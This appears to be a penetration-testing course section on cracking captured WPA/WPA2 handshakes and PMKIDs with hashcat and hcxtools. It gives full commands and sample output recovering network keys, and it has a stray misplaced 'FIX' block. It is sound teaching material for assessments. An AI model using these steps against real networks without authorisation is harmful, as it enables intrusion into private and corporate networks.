# Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

---

Another example is a wireless security assessment. Clients often ask for wireless assessments as part of an Internal Penetration Test engagement. While wireless is not always the most exciting, it can get interesting if you can capture a WPA/WPA2 handshake. Wireless networks are often not properly segmented from a company's corporate network, and successful authentication to the wireless network may grant full access to the internal corporate network.

`Hashcat` can be used to successfully crack both the MIC (4-way handshake) and PMKID (1st packet/handshake).

---

## Cracking MIC

When a client connecting to the wireless network and the wireless access point (AP) communicate, they must ensure that they both have/know the wireless network key but are not transmitting the key across the network. The key is encrypted and verified by the AP.

To perform this type of offline cracking attack, we need to capture a valid 4-way handshake by sending de-authentication frames to force a client (user) to disconnect from an AP. When the client reauthenticates (usually automatically), the attacker can attempt to sniff out the WPA 4-way handshake without their knowledge. This handshake is a collection of keys exchanged during the authentication process between the client and the associated AP. Note: wireless attacks are out of scope for this module but will be covered in other modules.

These keys are used to generate a common key called the Message Integrity Check (MIC) used by an AP to verify that each packet has not been compromised and received in its original state.

The 4-way handshake is illustrated in the following diagram:

![Diagram showing 802.1X communication between supplicant and authenticator, including message exchanges and key derivation.](https://academy.hackthebox.com/storage/modules/20/NEW_4-way-handshake.png)

Once we have successfully captured a 4-way handshake with a tool such as [airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng), we need to convert it to a format that can be supplied to `Hashcat` for cracking. The format required is `hccapx`, and `Hashcat` hosts an online service to convert to this format (not recommended for actual client data but fine for lab/practice exercises): [cap2hashcat online](https://hashcat.net/cap2hashcat). To perform the conversion offline, we need the `hashcat-utils` repo from GitHub.

We can clone the repo and compile the tool as follows:

#### Hashcat-Utils - Installation

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ git clone https://github.com/hashcat/hashcat-utils.git
underhill341@htb[/htb]$ cd hashcat-utils/src
underhill341@htb[/htb]$ make
```

Once the tool is compiled, we can run it and see the usage options:

#### Cap2hccapx - Syntax

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ ./cap2hccapx.bin 

usage: ./cap2hccapx.bin input.cap output.hccapx [filter by essid] [additional network essid:bssid]
```

Next, we need to supply a packet capture (.cap) file to the tool to convert to the .hccapx format to supply to `Hashcat`.

#### Cap2hccapx - Convert To Crackable File

## FIX
```
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
```

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ ./cap2hccapx.bin corp_capture1-01.cap mic_to_crack.hccapx

Networks detected: 1

[*] BSSID=cc:40:d0:a4:d0:96 ESSID=CORP-WIFI (Length: 9)
 --> STA=48:e2:44:a7:c4:fb, Message Pair=0, Replay Counter=1
 --> STA=48:e2:44:a7:c4:fb, Message Pair=2, Replay Counter=1
 --> STA=48:e2:44:a7:c4:fb, Message Pair=0, Replay Counter=1
 --> STA=48:e2:44:a7:c4:fb, Message Pair=2, Replay Counter=1
 --> STA=48:e2:44:a7:c4:fb, Message Pair=0, Replay Counter=1
 --> STA=48:e2:44:a7:c4:fb, Message Pair=2, Replay Counter=1
 --> STA=48:e2:44:a7:c4:fb, Message Pair=0, Replay Counter=1
 --> STA=48:e2:44:a7:c4:fb, Message Pair=2, Replay Counter=1

Written 8 WPA Handshakes to: /home/mrb3n/Desktop/mic_to_crack.hccapx
```

With this file, we can then move on to cracking using one or more of the techniques discussed earlier in this module. For this example, we will perform a straight dictionary attack to crack the WPA handshake. To attempt to crack this hash, we will use mode `22000`, as the previous mode `2500` has been deprecated. Our command for cracking this hash will look like `hashcat -a 0 -m 22000 mic_to_crack.hccapx /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt`.

Let's go ahead and try to recover the key!

#### Hashcat - Cracking WPA Handshakes

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ hashcat -a 0 -m 22000 mic_to_crack.hccapx /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

18cbc1c03cd674c75bb81aee4a75a086:cc40d0a4d096:48e244a7c4fb:CORP-WIFI:rockyou1
62b1bb7345e110abaaf8304c096239b0:cc40d0a4d096:48e244a7c4fb:CORP-WIFI:rockyou1
be2430ce7a4ed2ddb36fc94373197add:cc40d0a4d096:48e244a7c4fb:CORP-WIFI:rockyou1
15c472b7641042af642fc9ec0b65b500:cc40d0a4d096:48e244a7c4fb:CORP-WIFI:rockyou1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-PBKDF2-PMKID+EAPOL
Hash.Target......: mic_to_crack.hccapx
Time.Started.....: Wed Mar  9 11:20:36 2022 (0 secs)
Time.Estimated...: Wed Mar  9 11:20:36 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10052 H/s (8.25ms) @ Accel:128 Loops:512 Thr:1 Vec:8
Recovered........: 4/4 (100.00%) Digests
Progress.........: 2888/14344385 (0.02%)
Rejected.........: 2120/2888 (73.41%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3-7
Candidates.#1....: 123456789 -> celtic07

Started: Wed Mar  9 11:20:26 2022
Stopped: Wed Mar  9 11:20:38 2022
```

Armed with this key, we can now attempt to authenticate to the wireless network and attempt to gain access to the internal corporate network.

---

## Cracking PMKID

This attack can be performed against wireless networks that use WPA/WPA2-PSK (pre-shared key) and allows us to obtain the PSK being used by the targeted wireless network by attacking the AP directly. The attack does not require deauthentication (deauth) of any users from the target AP. The PMK is the same as in the MIC (4-way handshake) attack but can generally be obtained faster and without interrupting any users.

The Pairwise Master Key Identifier (PMKID) is the AP's unique identifier to keep track of the Pairwise Master Key (PMK) used by the client. The PMKID is located in the 1st packet of the 4-way handshake and can be easier to obtain since it does not require capturing the entire 4-way handshake. PMKID is calculated with HMAC-SHA1 with the PMK (Wireless network password) used as a key, the string "PMK Name," MAC address of the access point, and the MAC address of the station. Below is a visual representation of the PMKID calculation:

![Diagram showing PMKID derivation using PMK, MAC addresses of access point and station, and HMAC-SHA1-128.](https://academy.hackthebox.com/storage/modules/20/NEW_PMKID_calc.png)

To perform PMKID cracking, we need to obtain the pmkid hash. The first step is extracting it from the capture (.cap) file using a tool such as `hcxpcapngtool` from `hcxtools`. We can install `hcxtools` on Parrot using apt: `sudo apt install hcxtools`.

Note: In the past, this technique was able to be performed with `hcxpcaptool`, which has since been [replaced by](https://github.com/ZerBea/hcxtools/issues/166) `hcxpcapngtool` which we can compile and install directly from the [hcxtools GitHub repo](https://github.com/ZerBea/hcxtools), or via apt (`sudo apt install hcxtools`).

This can be performed with the deprecated tool hcxpcaptool. However, this tool is no longer present on the Pwnbox so compiling it, installing, and running it is an exercise left up to the reader but will be shown at the end of this section for completeness.

As mentioned above, we can install `hxctools`, which includes `hcxpcapngtool`, via `apt`. Alternatively, we can clone the `hcxtools` repository to our own VM, compile and install it.

#### Hcxtools - Installation

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ git clone https://github.com/ZerBea/hcxtools.git
underhill341@htb[/htb]$ cd hcxtools
underhill341@htb[/htb]$ make && make install
```

Once we've successfully installed `hcxtools` (if not already present on our attack machine), we can issue the command `hcxpcapngtool -h` to check out the options available with the tool.

#### Hcxpcapngtool - Help

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ hcxpcapngtool -h 
hcxpcapngtool 6.3.5-44-g6be8d76 (C) 2025 ZeroBeat
convert pcapng, pcap and cap files to hash formats that hashcat and JtR use
usage:
hcxpcapngtool <options>
hcxpcapngtool <options> input.pcapng
hcxpcapngtool <options> *.pcapng
hcxpcapngtool <options> *.pcap
hcxpcapngtool <options> *.cap
hcxpcapngtool <options> *.*

short options:
-o <file> : output WPA-PBKDF2-PMKID+EAPOL hash file (hashcat -m 22000)
            get full advantage of reuse of PBKDF2 on PMKID and EAPOL
-E <file> : output wordlist (autohex enabled on non ASCII characters) to use as input wordlist for cracker
            retrieved from every frame that contain an ESSID
-R <file> : output wordlist (autohex enabled on non ASCII characters) to use as input wordlist for cracker
            retrieved from PROBEREQUEST frames only
-I <file> : output unsorted identity list to use as input wordlist for cracker
-U <file> : output unsorted username list to use as input wordlist for cracker
-D <file> : output device information list
            format MAC MANUFACTURER MODELNAME SERIALNUMBER DEVICENAME UUID
-h        : show this help
-v        : show version

<SNIP>
```

Though the tool can be used for various tasks, we can use `hcxpcapngtool` to extract the hash as follows:

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ hcxpcapngtool cracking_pmkid.cap -o pmkidhash_corp

reading from cracking_pmkid.cap...

summary capture file
--------------------
file name................................: cracking_pmkid.cap
version (pcapng).........................: 1.0
operating system.........................: Linux 5.7.0-kali1-amd64
application..............................: hcxdumptool 6.0.7-22-g2f82e84
interface name...........................: wlan0
interface vendor.........................: 00c0ca
weak candidate...........................: 12345678
MAC ACCESS POINT.........................: 0c8112953006 (incremented on every new client)
MAC CLIENT...............................: fcc23374f354
REPLAYCOUNT..............................: 63795
ANONCE...................................: 4e0fee9e1a8961ca63b74023d90ac081d8677ae748b7050a559cf481cf50d31f
SNONCE...................................: 90d86a9fc2a314df52b3b36b9080c88e90488594f0aa83e84196bfce8b90d1ac
timestamp minimum (GMT)..................: 17.07.2020 10:07:19
timestamp maximum (GMT)..................: 17.07.2020 10:14:21
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianess (capture system)...............: little endian
packets inside...........................: 75
frames with correct FCS..................: 75
BEACON (total)...........................: 1
PROBEREQUEST.............................: 3
PROBERESPONSE............................: 1
EAPOL messages (total)...................: 69
EAPOL RSN messages.......................: 69
ESSID (total unique).....................: 3
EAPOLTIME gap (measured maximum usec)....: 172313401
EAPOL ANONCE error corrections (NC)......: working
REPLAYCOUNT gap (suggested NC)...........: 5
EAPOL M1 messages (total)................: 47
EAPOL M2 messages (total)................: 18
EAPOL M3 messages (total)................: 4
EAPOL pairs (total)......................: 41
EAPOL pairs (best).......................: 1
EAPOL pairs written to combi hash file...: 1 (RC checked)
EAPOL M12E2 (challenge)..................: 1
PMKID (total)............................: 45
PMKID (best).............................: 1
PMKID written to combi hash file.........: 1
```

We can check the contents of the file to ensure that we captured a valid hash:

#### PMKID-Hash

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ cat pmkidhash_corp 

7943ba84a475e3bf1fbb1b34fdf6d102*10da43bef746*80822381a9c8*434f52502d57494649
```

Once again, we will perform a straightforward dictionary attack in an attempt to crack the WPA handshake. To attempt to crack this hash, we will use mode `22000`, as the previous mode `16800` has been deprecated. Here, our command will be in the format:

#### Hashcat - Cracking PMKID

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ hashcat -a 0 -m 22000 pmkidhash_corp /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

hashcat (v6.2.6) starting...

<SNIP>

7943ba84a475e3bf1fbb1b34fdf6d102:10da43bef746:80822381a9c8:CORP-WIFI:cleopatra
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-PBKDF2-PMKID+EAPOL
Hash.Target......: pmkidhash_corp
Time.Started.....: Wed Mar  9 11:27:21 2022 (1 sec)
Time.Estimated...: Wed Mar  9 11:27:22 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    12563 H/s (3.49ms) @ Accel:1024 Loops:32 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 18130/14344385 (0.13%)
Rejected.........: 11986/18130 (66.11%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456789 -> celtic07

Started: Wed Mar  9 11:27:20 2022
Stopped: Wed Mar  9 11:27:23 2022
```

The process with the now-deprecated `hcxpcaptool` is similar.

#### Hcxpcaptool - Legacy

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ hcxpcaptool -h

hcxpcaptool 6.0.3-23-g1c078e4 (C) 2020 ZeroBeat
usage:
hcxpcaptool <options>
hcxpcaptool <options> [input.pcap] [input.pcap] ...
hcxpcaptool <options> *.cap
hcxpcaptool <options> *.*

options:
-o <file> : output hccapx file (hashcat -m 2500/2501)
-O <file> : output raw hccapx file (hashcat -m 2500/2501)
            this will disable all(!) 802.11 validity checks
            very slow!
-k <file> : output PMKID file (hashcat hashmode -m 16800 new format)
-K <file> : output raw PMKID file (hashcat hashmode -m 16801 new format)
            this will disable usage of ESSIDs completely
-z <file> : output PMKID file (hashcat hashmode -m 16800 old format and john)
-Z <file> : output raw PMKID file (hashcat hashmode -m 16801 old format and john)
            this will disable usage of ESSIDs completely
-j <file> : output john WPAPSK-PMK file (john wpapsk-opencl)
-J <file> : output raw john WPAPSK-PMK file (john wpapsk-opencl)
            this will disable all(!) 802.11 validity checks
            very slow!
-E <file> : output wordlist (autohex enabled) to use as input wordlist for cracker
-I <file> : output unsorted identity list
-U <file> : output unsorted username list
-M <file> : output unsorted IMSI number list
-P <file> : output possible WPA/WPA2 plainmasterkey list
-T <file> : output management traffic information list
            format = mac_sta:mac_ap:essid
-X <file> : output client probelist
            format: mac_sta:probed ESSID (autohex enabled)
-D <file> : output unsorted device information list
            format = mac_device:device information string
-g <file> : output GPS file
            format = GPX (accepted for example by Viking and GPSBabel)
-V        : verbose (but slow) status output
-h        : show this help
-v        : show version

<SNIP>
```

The syntax is a bit different, using the `-z` flag instead of `-o` for the output file. Using `hcxpcaptool`, we can extract the PMKID hash to run through `Hashcat` in the same way we did with the resultant hash from `hcxpcapngtool`.

#### Extract PMKID - Using Hcxpcaptool

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ hcxpcaptool -z pmkidhash_corp2 cracking_pmkid.cap 

reading from cracking_pmkid.cap
summary capture file:                           
---------------------
file name........................: cracking_pmkid.cap
file type........................: pcapng 1.0
file hardware information........: x86_64
capture device vendor information: 00c0ca
file os information..............: Linux 5.7.0-kali1-amd64
file application information.....: hcxdumptool 6.0.7-22-g2f82e84 (custom options)
network type.....................: DLT_IEEE802_11_RADIO (127)
endianness.......................: little endian
read errors......................: flawless
minimum time stamp...............: 17.07.2020 14:07:19 (GMT)
maximum time stamp...............: 17.07.2020 14:14:21 (GMT)
packets inside...................: 75
skipped damaged packets..........: 0
packets with GPS NMEA data.......: 0
packets with GPS data (JSON old).: 0
packets with FCS.................: 75
beacons (total)..................: 1
probe requests...................: 3
probe responses..................: 1
association responses............: 1
EAPOL packets (total)............: 69
EAPOL packets (WPA2).............: 69
PMKIDs (not zeroed - total)......: 1
PMKIDs (WPA2)....................: 45
PMKIDs from access points........: 1
best handshakes (total)..........: 1 (ap-less: 0)
best PMKIDs (total)..............: 1
summary output file(s):
-----------------------
1 PMKID(s) written to pmkidhash_corp
```

We can check the contents of the file to ensure that we captured a valid hash:

#### PMKID-Hash

Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

```shell-session
underhill341@htb[/htb]$ cat pmkidhash_corp2 

7943ba84a475e3bf1fbb1b34fdf6d102*10da43bef746*80822381a9c8*434f52502d57494649
```

From here we could run the `pmkidhash_corp2` file through Hashcat using mode `22000` as shown above.

---

## Closing Thoughts

Great! We have successfully cracked the PMKID hash and could now attempt to authenticate to the wireless network to gain a foothold or expand our reach during a real-world engagement.

This section covered some valuable techniques that can be used during penetration tests, wireless assessments, and red team assessments. They can also be used by defenders to test the security of their wireless networks. The attacks used to generate the example files used in this section will be covered in a wireless attacks module in HTB Academy.